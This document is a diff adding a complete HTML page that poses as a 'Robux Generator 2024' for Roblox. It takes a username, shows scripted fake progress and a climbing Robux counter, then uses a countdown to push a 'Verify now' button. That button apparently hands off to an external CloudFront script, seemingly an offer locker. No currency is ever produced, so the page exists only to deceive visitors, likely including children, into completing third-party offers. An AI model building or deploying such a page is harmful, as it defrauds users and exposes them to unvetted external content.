@@ -1,0 +1,205 @@
+<html><head>
+    <title>Roblox - Robux Generator 2024</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Robux Generator 2024">
+    <meta property="og:title" content="Robux Generator 2024">
+    <meta property="og:description" content="Robux Generator 2024">
+    <meta name="referrer" content="no-referrer">
+    <link rel="stylesheet" href="./resources/style.css">
+    <link rel="icon" type="image/x-icon" href="img/robux.png">
+    <script type="text/javascript">
+        var NPYsy_Yme_BBagqc={"it":4322209,"key":"3fb0f"};
+    </script>
+    <script src="https://d9cshxmf0qazr.cloudfront.net/6153a1a.js"></script>
+</head>
+<body>
+    <div class="content-all">
+        <div class="cardBox" id="maen2">
+            <div class="cadre">
+                <img src="./resources/logo.png" class="logo">
+                <div class="gems-Amt-Selec" id="gemsAmountSelected1" onclick="gemsAmountSelected('gemsAmountSelected1',' 1000 ')">
+                    <img src="./resources/robux.png" alt="lgo1" width="32" height="32" class="lgo-follo">
+                    <span style="font-size: 26px; font-weight: bold"> 1000</span>
+                </div>
+                <div class="gems-Amount" id="gemsAmountSelected2" onclick="gemsAmountSelected('gemsAmountSelected2',' 2500 ')">
+                    <img src="./resources/robux.png" alt="lgo2" width="35" height="35" class="lgo-follo">
+                    <span style="font-size: 26px; font-weight: bold"> 2500</span>
+                </div>
+                <div class="gems-Amount" id="gemsAmountSelected3" onclick="gemsAmountSelected('gemsAmountSelected3',' 5000 ')">
+                    <img src="./resources/robux.png" alt="lgo3" width="35" height="35" class="lgo-follo">
+                    <span style="font-size: 26px; font-weight: bold"> 5000</span>
+                </div>
+                <div class="gems-Amount" id="gemsAmountSelected4" onclick="gemsAmountSelected('gemsAmountSelected4',' 9999 ')">
+                    <img src="./resources/robux.png" alt="lgo4" width="35" height="35" class="lgo-follo">
+                    <span style="font-size: 26px; font-weight: bold"> 9999</span>
+                </div>
+                <div class="inputbox">
+                    <input type="text" class="u-i" placeholder="UserName" id="uid">
+                </div>
+                <div class="offer-btn" onclick="proStp1()">
+                    <p class="gen-text-btn">Generate</p>
+                </div>
+            </div>
+        </div>
+        <div class="z-box ontop" id="maen3" style="display: none">
+            <img src="./resources/logo.png" class="logo">
+            <a><span></span><span></span><span></span><span></span></a>
+            <div class="maen4">+<span id="gemsgen" class="gemsgen"></span> Robux</div>
+            <img src="./resources/robux.png" alt="lgo4" width="50" height="50" class="spin-trs">
+            <div class="pros-tex" id="loading-stp">Loading...</div>
+        </div>
+        <div id="myDi">
+            <div class="z-box" id="maen5" style="display: none">
+                <img src="./resources/logo.png" class="logo">
+                <a><span></span><span></span><span></span><span></span></a>
+
+                <div class="stp">
+                    <div class="last-tx">Processing<span class="loadot"></span></div>
+                    <div class="tx-last">
+                        Hello! <span id="genname" class="Ls-Tp"></span>, you are almost done
+                        adding <span id="coins-gms" class="Ls-Tp"></span>, complete the last
+                        step.
+                    </div>
+                    <a id="btncpa" class="cpa-btn" onclick="_Ri()">
+                        <div onclick="hideDiv()" class="offer-btn">
+                            <p class="gen-text-btn">Verify now</p>
+                        </div>
+                    </a>
+                    <div style="font-size: 16px; color: #bdbdbd; padding-top: 15px">
+                        This process usually takes about 2-3 minutes.
+                    </div>
+                    <div class="des-time"><span id="time">06:00</span></div>
+                    <div style="font-size: 14px; color: #bdbebe; margin: 2px">
+                        Remaining time
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<script type="text/javascript">
+    var gemsvalue = 1000;
+    function gemsAmountSelected(ramount, value) {
+        gemsvalue = value;
+        document
+            .getElementById("gemsAmountSelected1")
+            .classList.add("gems-Amount");
+        document
+            .getElementById("gemsAmountSelected2")
+            .classList.add("gems-Amount");
+        document
+            .getElementById("gemsAmountSelected3")
+            .classList.add("gems-Amount");
+        document
+            .getElementById("gemsAmountSelected4")
+            .classList.add("gems-Amount");
+        document
+            .getElementById("gemsAmountSelected1")
+            .classList.remove("gems-Amt-Selec");
+        document
+            .getElementById("gemsAmountSelected2")
+            .classList.remove("gems-Amt-Selec");
+        document
+            .getElementById("gemsAmountSelected3")
+            .classList.remove("gems-Amt-Selec");
+        document
+            .getElementById("gemsAmountSelected4")
+            .classList.remove("gems-Amt-Selec");
+        document.getElementById(ramount).classList.add("gems-Amt-Selec");
+        document.getElementById(ramount).classList.remove("gems-Amount");
+    }
+    function proStp1() {
+        name = document.getElementById("uid").value;
+        if (name == "") {
+            document.getElementById("uid").classList.add("eror-pulse");
+            setTimeout(function () {
+                document.getElementById("uid").classList.remove("eror-pulse");
+            }, 500);
+        } else {
+            proStp2();
+        }
+    }
+    function proStp2() {
+        document.getElementById("maen2").style.display = "none";
+        document.getElementById("maen3").style.display = "block";
+        var myVar2 = setInterval(UserTimer, 1000);
+        var linestep = 1;
+        function UserTimer() {
+            if (linestep == 1) {
+                document.getElementById("loading-stp").innerHTML =
+                    "Infusion process...";
+            } else if (linestep == 2) {
+                document.getElementById("loading-stp").innerHTML =
+                    'The process of adding <span style="font-size:20px; color:#00bbff;">' +
+                    gemsvalue +
+                    '</span> Robux for <span style="font-size:20px; color:#00bbff;">' +
+                    name +
+                    "</span>";
+                document.getElementById("genname").innerHTML = name;
+                var myVar2 = setInterval(UserTimerAddgems, 1);
+                var gemstext = 1;
+                function UserTimerAddgems() {
+                    if (gemstext > gemsvalue) {
+                        document.getElementById("gemsgen").innerHTML = gemsvalue;
+                        clearInterval(myVar2);
+                        var myVar3 = setInterval(UserTimerAddgems3, 800);
+                        var linestep = 1;
+                        function UserTimerAddgems3() {
+                            if (linestep == 2) {
+                            } else if (linestep == 3) {
+                                document.getElementById("loading-stp").innerHTML =
+                                    "Automatic Verification...";
+                            } else if (linestep == 4) {
+                                document.getElementById("loading-stp").innerHTML =
+                                    "Synchronization process...";
+                            } else if (linestep == 5) {
+                                clearInterval(myVar3);
+                                myFunNext();
+                            }
+                            linestep++;
+                        }
+                    } else {
+                        document.getElementById("gemsgen").innerHTML = gemstext;
+                        gemstext = gemstext + 11;
+                    }
+                }
+            }
+            linestep++;
+        }
+    }
+    function myFunNext() {
+        var myVar4 = setInterval(UserTimerAddgems4, 600);
+        var linestep = 1;
+        function UserTimerAddgems4() {
+            document.getElementById("maen3").style.display = "none";
+            document.getElementById("maen5").style.display = "block";
+            document.getElementById("coins-gms").innerHTML = gemsvalue + " Robux";
+            clearInterval(myVar4);
+        }
+    }
+    function startTimer(duration, display) {
+        var timer = duration,
+            minutes,
+            seconds;
+        setInterval(function () {
+            minutes = parseInt(timer / 60, 10);
+            seconds = parseInt(timer % 60, 10);
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+            display.textContent = minutes + ":" + seconds;
+            if (--timer < 0) {
+                timer = duration;
+            }
+        }, 1000);
+    }
+    window.onload = function () {
+        var tenMinutes = 60 * 10,
+            display = document.querySelector("#time");
+        startTimer(tenMinutes, display);
+    };
+    function hideDiv() {
+        var myDiv = document.getElementById("myDi");
+        myDiv.style.display = "none";
+    }
+</script>
+</body></html>
